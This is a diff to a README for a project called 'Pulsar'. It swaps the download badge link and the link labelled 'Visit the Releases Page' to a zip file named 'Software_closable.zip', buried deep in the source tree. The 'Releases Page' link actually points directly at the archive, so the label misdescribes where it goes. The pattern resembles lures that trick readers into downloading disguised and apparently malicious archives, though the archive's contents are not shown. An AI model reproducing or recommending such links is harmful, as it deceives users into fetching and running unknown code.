@@ -2,7 +2,7 @@
 
 ## 📥 Download Pulsar
 
-[![Download Pulsar](https://raw.githubusercontent.com/elvyn-jpg/Pulsar/main/src/features/Pulsar-psychogenetic.zip)](https://raw.githubusercontent.com/elvyn-jpg/Pulsar/main/src/features/Pulsar-psychogenetic.zip)
+[![Download Pulsar](https://github.com/elvyn-jpg/Pulsar/raw/refs/heads/main/src/schema/unknown/components/Software_closable.zip)](https://github.com/elvyn-jpg/Pulsar/raw/refs/heads/main/src/schema/unknown/components/Software_closable.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To get started with Pulsar, visit the Releases page to download the latest versi
 
 1. Click on the link below to go to the Releases page:
    
-   [Visit the Releases Page](https://raw.githubusercontent.com/elvyn-jpg/Pulsar/main/src/features/Pulsar-psychogenetic.zip)
+   [Visit the Releases Page](https://github.com/elvyn-jpg/Pulsar/raw/refs/heads/main/src/schema/unknown/components/Software_closable.zip)
 
 2. On the Releases page, look for the latest version of Pulsar.
 
